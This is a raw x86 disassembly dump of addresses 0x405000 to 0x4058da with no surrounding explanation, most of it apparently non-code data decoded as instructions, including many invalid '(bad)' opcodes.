  405000:	add    BYTE PTR [ebp+0x1],dl
  405003:	add    BYTE PTR [ebx+0x52],ah
  405006:	inc    ecx
  405007:	add    BYTE PTR [eax+eiz*2],bl
  40500a:	je     0x40505c
  40500c:	adc    DWORD PTR [edx+0x63],ebp
  40500f:	inc    ecx
  405010:	jmp    DWORD PTR [eax+0x72]
  405013:	gs lock jne 0x405017
  405017:	add    BYTE PTR [edi],ah
  405019:	push   0x61
  40501b:	fs pop ds
  40501d:	ins    BYTE PTR es:[edi],dx
  40501e:	bound  esi,QWORD PTR [edx+0x2]
  405021:	ja     0x40509c
  405023:	inc    ebp
  405024:	fild   DWORD PTR [eax+eax*1+0x0]
  405028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405029:	push   0x61
  40502b:	fs lahf 
  40502d:	ins    BYTE PTR es:[edi],dx
  40502e:	bound  esi,QWORD PTR [edx-0x3e]
  405031:	ja     0x4050ac
  405033:	inc    ebp
  405034:	mov    ebx,0x9c000052
  405039:	pusha  
  40503a:	je     0x405089
  40503c:	mov    esp,0xbe6c7561
  405041:	dec    ebp
  405042:	popa   
  405043:	outs   dx,BYTE PTR ds:[esi]
  405044:	xchg   DWORD PTR [ecx+0x65],ebp
  405047:	inc    ecx
  405048:	arpl   WORD PTR ds:0x77a00000,ax
  40504e:	gs popa 
  405050:	(bad)  
  405051:	pusha  
  405052:	inc    esi
  405053:	imul   ecx,DWORD PTR [edi-0x78ffbea0],0x80727476
  40505d:	fs je  0x4050a1
  405060:	arpl   WORD PTR ds:0x60240000,ax
  405066:	je     0x4050bf
	...
  405074:	add    BYTE PTR [eax],al
  405076:	add    BYTE PTR [edx+0x6b],cl
  405079:	outs   dx,DWORD PTR fs:[esi]
  40507b:	push   esp
  40507c:	jbe    0x4050c2
  40507e:	imul   edx,DWORD PTR [ecx+0x60],0x774c7463
  405085:	jns    0x4050c8
  405087:	arpl   WORD PTR ds:0x60240000,ax
  40508d:	je     0x4050dc
  40508f:	xor    al,0x61
  405091:	jne    0x4050ff
  405093:	push   es
  405094:	dec    ebp
  405095:	popa   
  405096:	outs   dx,BYTE PTR ds:[esi]
  405097:	jmp    FWORD PTR [eax+0x65]
  40509a:	push   edi
  40509b:	arpl   WORD PTR ds:0x75f0000,ax
  4050a1:	inc    eax
  4050a2:	add    BYTE PTR [edi+0x7],dl
  4050a5:	inc    eax
  4050a6:	add    BYTE PTR [edi],bh
  4050a8:	pop    es
  4050a9:	inc    eax
  4050aa:	add    BYTE PTR [edi],dh
  4050ac:	pop    es
  4050ad:	inc    eax
  4050ae:	add    BYTE PTR [ebx],bl
  4050b0:	pop    es
  4050b1:	inc    eax
  4050b2:	add    BYTE PTR [edi-0x3cffbffd],dh
  4050b8:	add    eax,DWORD PTR [eax+0x0]
  4050bb:	retf   
  4050bc:	add    eax,DWORD PTR [eax+0x0]
  4050bf:	pushf  
  4050c0:	bound  esi,QWORD PTR [eax+edx*2-0x4f]
  4050c4:	push   0x61bf4163
  4050c9:	jb     0x405130
  4050cb:	mov    al,0x74
  4050cd:	add    BYTE PTR [eax],al
  4050cf:	xchg   edi,eax
  4050d0:	push   0x6eaf6461
  4050d5:	bound  esi,QWORD PTR [edx-0x7e]
  4050d8:	jae    0x405153
  4050da:	inc    ebp
	...
  4050e7:	add    BYTE PTR [eax],al
  4050e9:	add    BYTE PTR [ebx+0x78000046],cl
  4050ef:	bound  esi,QWORD PTR [edx+0x6e]
  4050f2:	xchg   BYTE PTR [ecx+0x33],ch
  4050f5:	xor    al,BYTE PTR [ebp+0x61]
  4050f8:	ins    BYTE PTR es:[edi],dx
  4050f9:	ins    BYTE PTR es:[edi],dx
  4050fa:	arpl   WORD PTR ds:0x74760000,ax
  405100:	jbe    0x405165
  405102:	push   ecx
  405103:	jno    0x405133
  405105:	fs inc edi
  405107:	imul   eax,DWORD PTR [eax],0x6d623e00
  40510d:	jae    0x40514d
  40510f:	jno    0x405111
  405111:	add    BYTE PTR [esi+0x74],cl
  405114:	jbe    0x405179
  405116:	xor    DWORD PTR [ecx+0x2e],esi
  405119:	fs aas 
  40511b:	imul   eax,DWORD PTR [eax],0x6d623600
  405121:	arpl   WORD PTR [ebx],dx
  405123:	jle    0x405125
  405125:	add    BYTE PTR ds:0x1674726e,ch
  40512b:	data16 ins BYTE PTR es:[edi],dx
  40512d:	inc    ecx
  40512e:	imul   DWORD PTR [eax+0x6f]
  405131:	arpl   WORD PTR [ebx+0x5],sp
  405134:	add    BYTE PTR [eax],al
  405136:	or     eax,0xf674726e
  40513b:	gs ins BYTE PTR es:[edi],dx
  40513d:	inc    ecx
  40513e:	imul   DWORD PTR [eax+0x6f]
  405141:	arpl   WORD PTR [ebx+0x5],sp
  405144:	add    BYTE PTR [eax],al
  405146:	scas   al,BYTE PTR es:[edi]
  405147:	ins    DWORD PTR es:[di],dx
  405149:	popa   
  40514a:	ror    DWORD PTR [edi+0x69],cl
  40514d:	add    BYTE PTR gs:[eax],al
	...
  40515c:	add    ah,cl
  40515e:	dec    eax
  40515f:	inc    si
  405161:	retf   0x6569
  405164:	add    BYTE PTR [ebp-0x498b8d92],cl
  40516a:	data16 ins BYTE PTR es:[edi],dx
  40516c:	push   eax
  40516d:	mov    cl,0x68
  40516f:	je     0x4051d6
  405171:	xor    BYTE PTR [ecx+0x0],0x0
  405175:	stos   DWORD PTR es:[edi],eax
  405176:	bound  esp,QWORD PTR [ecx+0x70]
  405179:	mov    ds:0x806f6c69,al
  40517e:	add    eax,0x62880000
  405183:	jb     0x4051f3
  405185:	jle    0x4051f0
  405187:	xor    esi,DWORD PTR [edx]
  405189:	cmp    eax,0x636c6c61
  40518e:	add    eax,0x62240000
  405193:	je     0x4051e5
  405195:	push   ecx
  405196:	push   0x74506563
  40519b:	dec    eax
  40519c:	gs inc edx
  40519e:	jne    0x4051a0
  4051a0:	add    BYTE PTR [ebx+0x5],ah
  4051a3:	inc    esp
  4051a4:	add    DWORD PTR [ebx-0x5f],esp
  4051a7:	pop    ecx
  4051a8:	nop
  4051a9:	arpl   bx,bp
  4051ab:	add    eax,DWORD PTR [eax]
  4051ad:	arpl   dx,bp
  4051af:	add    eax,DWORD PTR [eax]
  4051b1:	arpl   di,si
  4051b3:	sti    
  4051b4:	add    BYTE PTR [ebx+0x36],ah
  4051b7:	add    eax,DWORD PTR [eax]
  4051b9:	arpl   si,bp
  4051bb:	add    eax,DWORD PTR [eax]
  4051bd:	arpl   WORD PTR [esi],bp
  4051bf:	add    al,0x0
	...
  4051cd:	add    BYTE PTR [eax],al
  4051cf:	add    BYTE PTR [ebx-0x12],ah
  4051d2:	add    eax,DWORD PTR [eax]
  4051d4:	arpl   si,bp
  4051d6:	add    eax,DWORD PTR [eax]
  4051d8:	arpl   si,bp
  4051da:	add    eax,DWORD PTR [eax]
  4051dc:	arpl   si,bp
  4051de:	add    eax,DWORD PTR [eax]
  4051e0:	arpl   sp,bp
  4051e2:	add    eax,DWORD PTR [eax]
  4051e4:	arpl   sp,bp
  4051e6:	add    eax,DWORD PTR [eax]
  4051e8:	arpl   sp,bp
  4051ea:	add    eax,DWORD PTR [eax]
  4051ec:	arpl   sp,bp
  4051ee:	add    eax,DWORD PTR [eax]
  4051f0:	arpl   WORD PTR [esp+eax*1+0x0],bp
  4051f4:	arpl   si,bx
  4051f6:	sbb    bh,BYTE PTR [edx+0x9afec5d]
  4051fc:	push   ss
  4051fd:	into   
  4051fe:	mov    ebx,0x25a9af01
  405203:	push   esp
  405204:	mov    eax,DWORD PTR ds:0xfa932077
  40520a:	push   0x67
  40520c:	xchg   ecx,eax
  40520d:	int    0x68
  40520f:	and    BYTE PTR [eax-0x7b919633],al
  405215:	fsub   DWORD PTR [ebx]
  405217:	bound  eax,QWORD PTR [esi+0x7575760c]
  40521d:	or     al,0x6d
  40521f:	outs   dx,BYTE PTR ds:[esi]
  405220:	and    DWORD PTR [eax-0x3e7cacb6],0x6a
  405227:	fs inc esi
  405229:	test   BYTE PTR [eax],0xd
  40522c:	pop    ecx
  40522d:	add    eax,0x56303cd
  405232:	jmp    0x40523a
	...
  405243:	arpl   WORD PTR ds:0x56340b9,ax
  405249:	popf   
  40524a:	add    al,0x60
  40524c:	add    eax,0x46c29f43
  405251:	jmp    0xe945b559
  405256:	add    esp,DWORD PTR [ebx+0x5]
  405259:	or     DWORD PTR [esp+edx*2],eax
  40525c:	add    al,0xf2
  40525e:	add    al,0x61
  405260:	xor    ebp,ecx
  405262:	stc    
  405263:	arpl   WORD PTR ds:0x5634de9,ax
  405269:	jmp    0x5545b571
  40526e:	in     eax,dx
  40526f:	arpl   WORD PTR ds:0x56313e9,ax
  405275:	jmp    0xe945b48d
  40527a:	add    esp,DWORD PTR [ebx+0x6313e905]
  405280:	add    eax,0x56305e9
  405285:	in     eax,dx
  405286:	add    esp,DWORD PTR [ebx+0x5]
  405289:	jmp    0xed45b591
  40528e:	add    esp,DWORD PTR [ebx+0x5]
  405291:	jmp    0xe945b599
  405296:	jae    0x4052fa
  405298:	add    eax,0x56305e9
  40529d:	mov    esp,0xeb05624b
  4052a2:	add    esp,DWORD PTR [ebx+0x5]
  4052a5:	jmp    0x4052ad
	...
  4052b6:	push   ebx
  4052b7:	add    eax,0x56313e9
  4052bc:	jmp    0xe945c5c4
  4052c1:	adc    esp,DWORD PTR [ebx+0x5]
  4052c4:	add    cl,ch
  4052c6:	pusha  
  4052c7:	add    eax,0x560d900
  4052cc:	add    cl,ch
  4052ce:	pusha  
  4052cf:	add    eax,0x560e900
  4052d4:	add    BYTE PTR ds:0x21000412,bl
  4052da:	pusha  
  4052db:	add    eax,0x560e900
  4052e0:	add    cl,ch
  4052e2:	pusha  
  4052e3:	add    eax,0x560e900
  4052e8:	add    cl,ch
  4052ea:	pusha  
  4052eb:	add    eax,0x560e900
  4052f0:	add    cl,ch
  4052f2:	pusha  
  4052f3:	add    eax,0x560e900
  4052f8:	add    cl,ch
  4052fa:	pusha  
  4052fb:	add    eax,0x560e900
  405300:	add    cl,ch
  405302:	pusha  
  405303:	add    eax,0x560e900
  405308:	add    cl,ch
  40530a:	pusha  
  40530b:	add    eax,0x560e900
  405310:	add    cl,ch
  405312:	pusha  
  405313:	add    eax,0x560e900
  405318:	add    cl,ch
	...
  405326:	add    BYTE PTR [eax],al
  405328:	add    BYTE PTR [eax+0x5],ah
  40532b:	add    cl,ch
  40532d:	pusha  
  40532e:	add    eax,0x560e900
  405333:	add    cl,ch
  405335:	pusha  
  405336:	add    eax,0x560e900
  40533b:	add    BYTE PTR [ecx+0x6d000699],dh
  405341:	pusha  
  405342:	add    eax,0x560e900
  405347:	add    cl,ch
  405349:	pusha  
  40534a:	add    eax,0x8ca0000
  40534f:	add    BYTE PTR [eax],al
  405351:	retf   0x8
  405354:	add    BYTE PTR [edx-0x45fffff8],bh
  40535a:	or     BYTE PTR [eax],al
  40535c:	add    BYTE PTR [esp+eiz*2+0x8ce7865],dl
  405363:	add    BYTE PTR [eax],al
  405365:	inc    ecx
  405366:	cld    
  405367:	add    BYTE PTR [eax],al
  405369:	mov    edx,0x8a000018
  40536e:	out    dx,al
  40536f:	add    BYTE PTR [eax],al
  405371:	mov    cl,BYTE PTR [edx]
  405373:	add    BYTE PTR [eax],al
  405375:	jp     0x40537f
  405377:	add    BYTE PTR [eax],al
  405379:	jp     0x405383
  40537b:	add    BYTE PTR [eax],al
  40537d:	mov    cl,BYTE PTR [eax]
  40537f:	add    BYTE PTR [eax],al
  405381:	push   0x9
  405383:	add    BYTE PTR [eax+0x64],ah
  405386:	jnp    0x4053ec
  405388:	popa   
  405389:	push   cs
  40538a:	push   0x0
	...
  40539b:	add    BYTE PTR [edx+0x7],cl
  40539e:	add    BYTE PTR [eax],al
  4053a0:	dec    edx
  4053a1:	sbb    BYTE PTR [ecx],al
  4053a3:	add    BYTE PTR [edx],bh
  4053a5:	or     al,BYTE PTR [eax]
  4053a7:	add    BYTE PTR [edx],bh
  4053a9:	or     BYTE PTR [ecx],al
  4053ab:	add    BYTE PTR [edx+0x8],cl
  4053ae:	add    BYTE PTR [eax],al
  4053b0:	dec    edx
  4053b1:	or     BYTE PTR [eax],al
  4053b3:	add    BYTE PTR [edx],bh
  4053b5:	or     BYTE PTR [eax],al
  4053b7:	add    BYTE PTR [edx+0x9],bh
  4053ba:	add    BYTE PTR [eax+0x34],al
  4053bd:	push   esp
  4053be:	popa   
  4053bf:	je     0x40542c
  4053c1:	or     DWORD PTR [eax],eax
  4053c3:	add    BYTE PTR [edx-0x5ffffba],al
  4053c9:	daa    
  4053ca:	add    DWORD PTR [eax],eax
  4053cc:	or     cl,BYTE PTR [edx+0x0]
  4053cf:	add    BYTE PTR [edx],cl
  4053d1:	or     al,BYTE PTR [ecx]
  4053d3:	add    BYTE PTR [ebx-0x22],ah
  4053d6:	add    eax,DWORD PTR [eax]
  4053d8:	arpl   si,bx
  4053da:	add    eax,DWORD PTR [eax]
  4053dc:	arpl   si,bx
  4053de:	add    eax,DWORD PTR [eax]
  4053e0:	arpl   WORD PTR [esi-0x225cfffd],bx
  4053e6:	add    eax,DWORD PTR [eax]
  4053e8:	arpl   si,bx
  4053ea:	add    eax,DWORD PTR [eax]
  4053ec:	arpl   si,bx
  4053ee:	add    eax,DWORD PTR [eax]
  4053f0:	arpl   si,bx
  4053f2:	add    eax,DWORD PTR [eax]
  4053f4:	arpl   WORD PTR [ecx-0x2ec41374],si
  4053fa:	adc    eax,DWORD PTR [eax+0x63]
  4053fd:	push   es
  4053fe:	jne    0x405401
	...
  40540c:	add    BYTE PTR [eax],al
  40540e:	add    BYTE PTR [eax+0x5b75f7f2],ah
  405414:	mov    BYTE PTR [edx],al
  405416:	push   0x63
  405418:	push   es
  405419:	mov    esp,0xccde63da
  40541e:	ret    0xde5f
  405421:	push   eax
  405422:	mov    edi,DWORD PTR [edi+0x45]
  405425:	sub    dl,BYTE PTR [eax]
  405427:	and    ebx,esi
  405429:	sti    
  40542a:	jb     0x40548e
  40542c:	lahf   
  40542d:	test   DWORD PTR [ebx+0x7403f4d6],0x8516758
  405437:	fmul   st,st(6)
  405439:	div    BYTE PTR [ebp+0x6b]
  40543c:	stos   DWORD PTR es:[edi],eax
  40543d:	push   edx
  40543e:	or     BYTE PTR [edx],ch
  405440:	lahf   
  405441:	add    BYTE PTR [eax],al
  405443:	xchg   esi,eax
  405444:	addr16 call 0x6cd573cd
  40544a:	dec    edi
  40544b:	jae    0x405469
  40544d:	add    al,0xf8
  40544f:	xchg   ecx,eax
  405450:	ffree  st(2)
  405452:	dec    DWORD PTR [edx+esi*8]
  405455:	pop    es
  405456:	(bad)  
  405457:	sahf   
  405458:	je     0x405419
  40545a:	inc    ebp
  40545b:	inc    DWORD PTR ds:0x56303e9
  405461:	jb     0x4054b4
  405463:	pop    ebx
  405464:	jle    0x405461
  405466:	imul   esp,DWORD PTR [ebx-0xe],0x78dc13d4
  40546d:	inc    ebp
  40546e:	test   DWORD PTR [esi-0x13],0x713e
	...
  405481:	add    BYTE PTR [ebx-0xe],bl
  405484:	fwait
  405485:	setp   bh
  405488:	fld    QWORD PTR [ebx]
  40548a:	push   ss
  40548b:	jle    0x4054a2
  40548d:	sbb    DWORD PTR [edi+0x537d91ed],0x45
  405494:	jmp    0x2a448694
  405499:	mul    DWORD PTR [eax+ecx*2+0x5630401]
  4054a0:	jmp    0xea317b63
  4054a5:	add    esp,DWORD PTR [ebx+0x5]
  4054a8:	bound  edx,QWORD PTR [ecx+0x6b]
  4054ab:	jle    0x4054a8
  4054ad:	mov    BYTE PTR [esi],bl
  4054af:	in     eax,dx
  4054b0:	cmp    DWORD PTR [edx+0x61],ebp
  4054b3:	repnz pop esp
  4054b5:	clc    
  4054b6:	fs js  0x40548a
  4054b9:	not    dh
  4054bb:	std    
  4054bc:	lds    edx,FWORD PTR [ecx+0x6f]
  4054bf:	jle    0x4054e5
  4054c1:	cld    
  4054c2:	sbb    al,bh
  4054c4:	in     eax,dx
  4054c5:	add    ebp,DWORD PTR [esi+0x2782bd7e]
  4054cb:	in     eax,dx
  4054cc:	adc    edx,eax
  4054ce:	push   ebx
  4054cf:	inc    ebp
  4054d0:	jmp    0xaa4506d0
  4054d5:	neg    BYTE PTR [eax+ecx*2]
  4054d8:	xchg   ecx,eax
  4054d9:	add    esp,DWORD PTR [ebx+0x5]
  4054dc:	jmp    0xea31f39f
  4054e1:	add    esp,DWORD PTR [ebx+0x5]
  4054e4:	add    BYTE PTR [edx+0x0],ah
	...
  4054f3:	add    BYTE PTR [eax],al
  4054f5:	mov    bl,0xfd
  4054f7:	mov    bl,bl
  4054f9:	jmp    0x405542
  4054fb:	clc    
  4054fc:	mov    ecx,0xd4ff048a
  405501:	hlt    
  405502:	icebp  
  405503:	jne    0x405556
  405505:	in     eax,dx
  405506:	ja     0x405510
  405508:	dec    esi
  405509:	xor    bl,BYTE PTR [ecx]
  40550b:	(bad)  
  40550c:	mov    esp,0x3e87dd68
  405511:	aad    0xf1
  405513:	push   eax
  405514:	bound  esi,QWORD PTR [ebx]
  405516:	std    
  405517:	mov    bl,bl
  405519:	dec    edx
  40551a:	add    eax,0x77ade96a
  40551f:	cld    
  405520:	push   ds
  405521:	xor    ebp,ebp
  405523:	call   FWORD PTR [eax+ebx*2+0x38f552f2]
  40552a:	jle    0x405581
  40552c:	add    DWORD PTR [ecx+0x58],esp
  40552f:	or     al,0xc2
  405531:	mov    al,0x7a
  405533:	push   es
  405534:	ret    0xbba0
  405537:	ret    0x60e1
  40553a:	lods   eax,DWORD PTR ds:[esi]
  40553b:	add    ecx,ebp
  40553d:	pusha  
  40553e:	add    eax,0x55fabc9
  405543:	push   ebp
  405544:	bound  edi,QWORD PTR [ebx-0x7b]
  405547:	(bad)  
  405548:	int    0xcf
  40554a:	and    BYTE PTR [ecx],dl
  40554c:	sub    DWORD PTR [edi-0x13],ebx
  40554f:	jb     0x405539
  405551:	and    esi,ecx
  405553:	(bad)  
  405554:	cmp    al,0x6f
  405556:	lock jne 0x40553a
	...
  405565:	add    BYTE PTR [eax],al
  405567:	add    BYTE PTR [eax+0x6e],cl
  40556a:	jmp    DWORD PTR [esi+0x14bffd2e]
  405570:	arpl   WORD PTR [esi+0x7c60e5c2],di
  405576:	push   ebp
  405577:	loope  0x405564
  405579:	adc    ecx,DWORD PTR [ebp+0x50ed4700]
  40557f:	call   DWORD PTR [edi]
  405581:	adc    eax,0xf9fe75ff
  405586:	jne    0x405590
  405588:	lea    edx,[ebx+0xc]
  40558b:	test   DWORD PTR [edx+0x71],ecx
  40558e:	adc    ecx,DWORD PTR [ebx+0x453bf8c7]
  405594:	jmp    0x4:0xcbb8075f
  40559b:	add    BYTE PTR [ecx],dh
  40559d:	out    dx,eax
  40559e:	sub    al,al
  4055a0:	xor    DWORD PTR [ebx],eax
  4055a2:	sub    eax,eax
  4055a4:	add    ebx,0xc
  4055a7:	add    bh,dl
  4055a9:	jge    0x405597
  4055ab:	add    DWORD PTR [esi+0x476856ed],0x14
  4055b2:	inc    eax
  4055b3:	add    BYTE PTR [edx+0x73],dl
  4055b6:	add    ebx,eax
  4055b8:	ins    DWORD PTR es:[edi],dx
  4055b9:	xchg   BYTE PTR [ebp+0xc],bh
  4055bc:	mov    ah,BYTE PTR [eax+0x6]
  4055bf:	or     DWORD PTR [edi],0xfffffffc
  4055c2:	push   DWORD PTR [ebp+esi*2+0x1d]
  4055c6:	rcr    BYTE PTR [esi+0x43],0xc3
  4055ca:	or     al,0x0
	...
  4055d8:	add    BYTE PTR [eax],al
  4055da:	add    BYTE PTR [ecx],cl
  4055dc:	ja     0x4055ee
  4055de:	add    BYTE PTR [edi],dl
  4055e0:	sti    
  4055e1:	mov    bh,0x1
  4055e3:	jp     0x4055e9
  4055e5:	add    BYTE PTR [esi+0x3],bl
  4055e8:	(bad)  
  4055e9:	or     al,0x0
  4055eb:	rcr    DWORD PTR [edi+0xc],1
  4055ee:	mov    DWORD PTR [edi+0x3a0000ed],0x42558b04
  4055f8:	jge    0x40560c
  4055fa:	lea    eax,[edi+0x57ff50ed]
  405600:	sbb    DWORD PTR [esi-0x1],edx
  405603:	arpl   WORD PTR [ecx],dx
  405605:	or     al,0xff
  405607:	mov    cl,0xee
  405609:	jle    0x4055cb
  40560b:	call   0xc1b5:0xadc028df
  405612:	or     al,0x63
  405614:	pop    ebx
  405615:	jbe    0x405613
  405617:	arpl   cx,di
  405619:	cld    
  40561a:	sub    ah,BYTE PTR [ebx]
  40561c:	enter  0xc2ca,0x5f
  405620:	fimul  WORD PTR [eax-0xc2518bb]
  405626:	sub    DWORD PTR [esi],esp
  405628:	out    dx,al
  405629:	outs   dx,BYTE PTR ds:[esi]
  40562a:	les    ebx,FWORD PTR [ebx]
  40562c:	fld    QWORD PTR [ebx]
  40562e:	add    BYTE PTR [ebx-0x70],ah
  405631:	retf   0x57c2
  405634:	fimul  WORD PTR [esi-0x75]
  405637:	iret   
  405638:	pop    esp
  405639:	mov    edi,0xf426c4f8
  40563e:	push   0x0
	...
  40564b:	add    BYTE PTR [eax],al
  40564d:	add    BYTE PTR [edi-0x14],ah
  405650:	inc    ebx
  405651:	add    BYTE PTR [ebx-0x633cfd75],ch
  405657:	add    DWORD PTR [ebx],0x6a
  40565a:	arpl   WORD PTR [eax+eax*1+0x94636a],dx
  405661:	push   0x8003de63
  405666:	jl     0x4056e0
  405668:	or     ebp,eax
  40566a:	loop   0x40561a
  40566c:	add    al,0x0
  40566e:	fisubr DWORD PTR [eax]
  405670:	lock inc eax
  405672:	out    dx,al
  405673:	loope  0x405631
  405675:	ret    0xdc6b
  405678:	pop    ebp
  405679:	add    dh,ah
  40567b:	and    esp,ebp
  40567d:	push   eax
  40567e:	mov    ebx,0x630013dc
  405683:	imul   ecx,DWORD PTR [ecx-0xc5fb308],0x1c063450
  40568d:	lock cmp esp,DWORD PTR [ebx-0x4a]
  405691:	add    al,0x63
  405693:	cli    
  405694:	test   al,0x79
  405696:	ins    DWORD PTR es:[edi],dx
  405697:	out    dx,al
  405698:	adc    al,0xf0
  40569a:	or     edx,DWORD PTR [ecx-0x62]
  40569d:	add    al,0x63
  40569f:	sbb    ch,BYTE PTR [ecx-0x1701de43]
  4056a5:	bnd jbe 0x405695
  4056a8:	pop    esp
  4056a9:	mov    ebx,edi
  4056ab:	fisub  WORD PTR [esi-0xd]
  4056ae:	xchg   ebx,eax
  4056af:	out    dx,al
  4056b0:	aam    0xff
	...
  4056be:	add    BYTE PTR [eax],al
  4056c0:	add    ah,bh
  4056c2:	adc    al,0x56
  4056c4:	repz fadd QWORD PTR [edx+0x7863ebcc]
  4056cb:	test   ebx,esi
  4056cd:	push   esi
  4056ce:	icebp  
  4056cf:	push   ecx
  4056d0:	cmp    ebp,DWORD PTR [ebp+eax*1+0x562abe9]
  4056d7:	jmp    0xf20400df
  4056dc:	add    edx,DWORD PTR [esi]
  4056de:	jp     0x4056ed
  4056e0:	pop    esp
  4056e1:	fcom   QWORD PTR [ebx]
  4056e3:	test   eax,0xe8739b03
  4056e8:	(bad)  
  4056e9:	xchg   esp,eax
  4056ea:	pop    ebx
  4056eb:	jmp    0x40574a
  4056ed:	arpl   si,bp
  4056ef:	je     0x4056ec
  4056f1:	jl     0x405694
  4056f3:	hlt    
  4056f4:	bnd jl 0x4056b3
  4056f7:	sub    ecx,DWORD PTR [eax]
  4056f9:	arpl   WORD PTR [eax+0x72],bx
  4056fc:	(bad)  
  4056fe:	test   al,0xfb
  405700:	inc    ebx
  405701:	arpl   bp,bp
  405703:	pop    ebx
  405704:	add    eax,0x443ee20
  405709:	leave  
  40570a:	add    eax,0xdd5b78c6
  40570f:	outs   dx,BYTE PTR ds:[esi]
  405710:	lock inc esp
  405712:	out    dx,al
  405713:	add    BYTE PTR [eax+0x14000926],ah
  405719:	mov    ah,0xe1
  40571b:	sub    DWORD PTR [ebp-0x43ba2c8],0xffffffa0
  405722:	add    eax,0x1bf8
	...
  405733:	add    BYTE PTR [esi-0x3e],ah
  405736:	dec    DWORD PTR [esi+0x2c8f019b]
  40573c:	inc    ebp
  40573e:	inc    ebp
  40573f:	jge    0x4057a1
  405741:	add    eax,0x59ee900
  405746:	push   esp
  405748:	hlt    
  405749:	out    dx,al
  40574a:	jne    0x40573d
  40574c:	or     BYTE PTR [ebp+edi*8+0x5e],ah
  405750:	icebp  
  405751:	jns    0x4057a8
  405753:	loope  0x4057b2
  405755:	adc    edi,edi
  405757:	aam    0xc4
  405759:	in     eax,dx
  40575a:	jne    0x40579d
  40575c:	shl    DWORD PTR [edi+0x8],1
  40575f:	ds cs or eax,0xedb82bc9
  405766:	push   esp
  405767:	bound  edx,QWORD PTR [esp+ebx*2+0x520fa00]
  40576e:	clc    
  40576f:	fwait
  405770:	pop    edi
  405771:	ret    0x83ff
  405774:	pusha  
  405775:	out    dx,al
  405776:	jne    0x405759
  405778:	mov    eax,0x9106ff9a
  40577d:	mov    ebx,0x5860e5c2
  405782:	mov    eax,DWORD PTR ds:0x6a1457fd
  405788:	inc    esi
  405789:	add    eax,0xc2a9ed75
  40578e:	adc    cl,ch
  405790:	jae    0x405809
  405792:	adc    dh,dl
  405794:	aam    0xf9
  405796:	(bad)  
  405797:	push   esp
	...
  4057a4:	add    BYTE PTR [eax],al
  4057a6:	add    BYTE PTR [edi-0x1b],dl
  4057a9:	hlt    
  4057aa:	add    BYTE PTR [edi],ah
  4057ac:	idiv   edi
  4057ae:	mov    ebp,DWORD PTR [edi+0xd]
  4057b1:	and    DWORD PTR [edx],eax
  4057b3:	add    eax,esp
  4057b5:	adc    BYTE PTR [eax],al
  4057b7:	dec    edi
  4057b8:	push   0xffffffec
  4057ba:	cmp    esi,0xfffffff5
  4057bd:	push   DWORD PTR [ebp+0x36]
  4057c0:	dec    ebx
  4057c1:	add    al,0x8d
  4057c3:	dec    edi
  4057c4:	cmc    
  4057c5:	push   eax
  4057c6:	jmp    FWORD PTR [edi-0x17]
  4057c9:	out    0xc3,eax
  4057cb:	in     eax,0xf6
  4057cd:	dec    DWORD PTR [ebx+0x3883053f]
  4057d3:	or     dh,BYTE PTR [ebp+0x7]
  4057d6:	mov    edi,DWORD PTR [edi]
  4057d8:	cmc    
  4057d9:	bswap  eax
  4057db:	xchg   ecx,eax
  4057dc:	add    ebp,DWORD PTR [ebx]
  4057de:	shl    BYTE PTR [ebx],0xc3
  4057e1:	or     BYTE PTR [eax],al
  4057e3:	pop    ds
  4057e4:	push   0xffffffec
  4057e6:	cmp    DWORD PTR [esi-0xb],0xffffffff
  4057ea:	jne    0x4057c2
  4057ec:	dec    edx
  4057ed:	add    cl,BYTE PTR [ebp-0xaf0901]
  4057f3:	push   eax
  4057f5:	out    0x97,eax
  4057f7:	test   esi,esi
  4057f9:	dec    DWORD PTR [ebx+0x3882ecff]
  4057ff:	mov    edx,0x3d0f0874
  405804:	inc    esp
  405805:	inc    BYTE PTR [esi+0x2b02ca3e]
	...
  405817:	add    BYTE PTR [eax],al
  405819:	add    BYTE PTR [edx],bh
  40581b:	mov    al,0xc2
  40581d:	or     BYTE PTR [edx+0x53],bh
  405820:	mov    ebp,esp
  405822:	or     DWORD PTR [ebp-0x14100004],edi
  405828:	imul   eax,DWORD PTR [ecx],0x50ff42f7
  40582e:	test   DWORD PTR [ebx+0x8],esi
  405831:	call   0x31a099
  405836:	push   esp
  405837:	addr16 inc esi
  405839:	or     al,0xe0
  40583b:	add    eax,0xdb5d7404
  405840:	mov    ecx,0x5c73c45
  405845:	sub    esp,DWORD PTR [ebx]
  405847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405848:	lds    ecx,FWORD PTR [eax]
  40584a:	arpl   WORD PTR [ecx],bp
  40584c:	jge    0x40583a
  40584e:	fdiv   DWORD PTR [eax]
  405850:	adc    al,0x83
  405852:	pop    ecx
  405853:	fidiv  WORD PTR [esi+0x4]
  405856:	sub    ah,BYTE PTR [eax-0x16f20001]
  40585c:	(bad)  
  40585d:	dec    BYTE PTR [esi-0x1f240a]
  405863:	jb     0x405855
  405865:	or     esp,DWORD PTR [ebx]
  405867:	icebp  
  405868:	cld    
  405869:	mov    dl,BYTE PTR [esi+0x6302c8ee]
  40586f:	fiadd  WORD PTR [ebx]
  405871:	add    al,cl
  405873:	loopne 0x4058d2
  405875:	add    esp,edx
  405877:	sar    bh,1
  405879:	(bad)  
  40587a:	push   esi
  40587b:	neg    bl
  40587d:	push   ecx
	...
  40588a:	add    BYTE PTR [eax],al
  40588c:	add    bh,al
  40588e:	sub    dh,al
  405890:	leave  
  405891:	mov    eax,ds:0xe85503e1
  405896:	sub    DWORD PTR [esp+eax*8+0x757cabaf],eax
  40589d:	push   edi
  40589e:	cwde   
  40589f:	add    ecx,DWORD PTR [ebp-0xacedda]
  4058a5:	push   cs
  4058a6:	out    dx,al
  4058a7:	pop    ecx
  4058a8:	call   DWORD PTR [esi]
  4058aa:	neg    bl
  4058ac:	mov    al,ds:0xb03ddae
  4058b1:	mov    ds:0xf6830969,eax
  4058b6:	fld    DWORD PTR [edx]
  4058b8:	jne    0x40591e
  4058ba:	add    eax,0xbe05c412
  4058bf:	stos   DWORD PTR es:[edi],eax
  4058c0:	add    BYTE PTR [ebx+0x7e],ah
  4058c3:	sub    al,0xf0
  4058c5:	pusha  
  4058c6:	cmc    
  4058c7:	add    BYTE PTR [ecx+0x73],cl
  4058ca:	jo     0x405866
  4058cc:	lods   al,BYTE PTR ds:[esi]
  4058cd:	bound  eax,QWORD PTR ds:0xbc9d03e9
  4058d3:	stos   DWORD PTR es:[edi],eax
  4058d4:	add    BYTE PTR [ebx+0x50],ah
  4058d7:	(bad)  
  4058d8:	loopne 0x4058bc
  4058da:	shl    DWORD PTR [ecx],0xef
